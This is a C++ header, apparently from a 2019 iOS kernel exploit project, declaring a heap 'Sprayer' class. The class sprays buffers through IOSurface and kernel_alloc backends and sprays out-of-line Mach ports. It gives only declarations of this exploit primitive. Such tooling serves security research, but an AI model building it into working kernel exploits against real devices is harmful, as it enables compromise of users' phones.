// <3 nedwill 2019
#ifndef SPRAY_H_
#define SPRAY_H_

#include <stddef.h>
#include <stdint.h>

#include <memory>
#include <vector>

#include <mach/mach.h>

#include "port.h"

// Heap sprayer, using Brandon's iosurface+kernel_alloc backends
class Sprayer {
public:
  Sprayer();
  // Destroying sprayer frees all associated memory
  ~Sprayer();

  // Feed a buffer (data, size), and spray count of them
  // Uses iosurface
  bool Spray(void *data, uint32_t size, uint32_t count);

  // Sprays ool ports, can fail to create the port
  // ool_port is the port that is sprayed in the array
  bool SprayOOLPorts(size_t zone_size, mach_port_t ool_port);

  void CreatePorts(size_t num_ports);

  const std::vector<std::unique_ptr<OOLHoldingPort>> &ool_holding_ports() {
    return ool_holding_ports_;
  }

private:
  std::vector<mach_port_t> ool_ports_;
  // Use unique_ptr to ensure only one port at a time
  std::vector<std::unique_ptr<OOLHoldingPort>> ool_holding_ports_;
};

#endif /* SPRAY_H_ */
